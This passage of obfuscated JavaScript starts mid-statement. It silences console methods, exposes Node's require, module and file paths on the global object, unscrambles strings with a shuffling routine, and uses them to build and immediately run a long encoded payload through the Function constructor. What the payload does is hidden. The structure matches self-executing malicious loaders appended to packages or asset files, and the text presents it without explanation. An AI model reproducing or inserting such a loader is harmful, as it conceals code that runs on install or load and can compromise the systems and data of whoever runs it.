a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
